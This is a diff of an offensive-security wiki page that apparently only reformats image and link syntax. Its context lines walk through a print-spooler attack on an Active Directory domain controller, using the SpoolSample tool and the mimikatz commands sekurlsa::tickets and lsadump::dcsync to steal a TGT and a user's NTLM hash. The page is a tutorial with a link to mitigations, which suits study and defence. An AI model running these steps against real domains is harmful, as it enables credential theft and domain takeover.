@@ -24,13 +24,13 @@ We can check if a spool service is running on a remote host like so:
 ls \\dc01\pipe\spoolss
 ```
 
-![](<../../.gitbook/assets/image (503).png>)
+![[image (503).png]]
 
 If the spoolss was not running, we would receive an error.
 
 Another way to check if the spoolss is running on a remote machine is:
 
-![](<../../.gitbook/assets/image (504).png>)
+![[image (504).png]]
 
 Now, after compiling the amazing PoC [SpoolSample](https://github.com/leechristensen/SpoolSample) by [@tifkin\_](https://twitter.com/tifkin\_), we execute it with two arguments `target` and `server` (DC with spoolss running on it):
 
@@ -38,7 +38,7 @@ Now, after compiling the amazing PoC [SpoolSample](https://github.com/leechriste
 .\SpoolSample.exe dc01 ws01
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-31 23-32-34.png>)
+![[Screenshot from 2018-10-31 23-32-34.png]]
 
 We are shown a message that the target attemped authenticating to our compromised system, so let's check if we can retrieve DC01 TGT:
 
@@ -46,7 +46,7 @@ We are shown a message that the target attemped authenticating to our compromise
 mimikatz # sekurlsa::tickets
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-31 23-33-49.png>)
+![[Screenshot from 2018-10-31 23-33-49.png]]
 
 We indeed got a TGT for DC01$ computer!
 
@@ -56,7 +56,7 @@ With this, we can make our compromised system `ws01$` appear like a Domain Contr
 mimikatz # lsadump::dcsync /domain:offense.local /user:spotless
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-31 23-43-32.png>)
+![[Screenshot from 2018-10-31 23-43-32.png]]
 
 The above clearly shows the attack was successful and an NTLM hash for the user spotless got retrieved -  get cracking or passing it now.
 
@@ -66,8 +66,8 @@ For mitigations, see [Domain Compromise via Unrestricted Kerberos Delegation](do
 
 ## References
 
-{% embed url="https://github.com/leechristensen/SpoolSample" %}
+[github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
 
-{% embed url="https://adsecurity.org/?p=4056" %}
+[adsecurity.org/?p=4056](https://adsecurity.org/?p=4056)
 
-{% embed url="https://adsecurity.org/?p=2053" %}
+[adsecurity.org/?p=2053](https://adsecurity.org/?p=2053)
